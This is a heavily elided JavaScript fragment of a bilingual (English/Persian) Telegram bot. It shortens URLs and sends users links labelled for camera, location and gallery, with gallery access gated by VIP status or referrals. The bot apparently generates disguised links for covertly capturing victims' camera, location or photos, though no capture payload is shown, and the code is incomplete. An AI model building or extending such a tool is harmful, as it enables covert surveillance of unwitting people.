...
const backToMenuKeyboard = (lang) => {
  if (!keyboardCache.has(`back_${lang}`)) {
    keyboardCache.set(`back_${lang}`, {
      reply_markup: {
        inline_keyboard: [
  ...
  return keyboardCache.get(`back_${lang}`);
};
...
const shortenUrl = async (longUrl, chatId, type) => {
  ...
  try {
    const response = await fetch(
      ...
      { method: 'GET', signal: AbortSignal.timeout(5000) } // Timeout to avoid hanging
    );
  ...
  try {
    ...
    if (update.message) {
      ...
      if (text?.startsWith('/start')) {
        ...
        if (text === messages[lang].adminMenu.stats) {
          ...
          await bot.telegram.sendMessage(chatId, messages[lang].welcome(user.username), mainMenuKeyboard(lang));
    ...
    if (update.callback_query) {
      ...
      if (callbackData === 'lang_en') {
        ...
        await bot.telegram.answerCbQuery(callbackQueryId, 'Language set to English');
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(chatId, messages['en'].welcome(user.username), mainMenuKeyboard('en'));
      }
        ...
        await bot.telegram.answerCbQuery(callbackQueryId, 'زبان به فارسی تنظیم شد');
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(chatId, messages['fa'].welcome(user.username), mainMenuKeyboard('fa'));
      }
        ...
        await bot.telegram.sendMessage(chatId, messages[lang].cameraMessage(shortUrl), {
          parse_mode: 'Markdown',
        ...
        await bot.telegram.sendMessage(chatId, messages[lang].locationMessage(shortUrl), {
          parse_mode: 'Markdown',
          reply_markup: backToMenuKeyboard(lang).reply_markup,
        });
        await bot.telegram.answerCbQuery(callbackQueryId);
        ...
        if (user.isVip || userReferrals >= requiredReferrals) {
          ...
          await bot.telegram.sendMessage(chatId, messages[lang].galleryMessage(shortUrl), {
            parse_mode: 'Markdown',
            reply_markup: backToMenuKeyboard(lang).reply_markup,
          });
        } else {
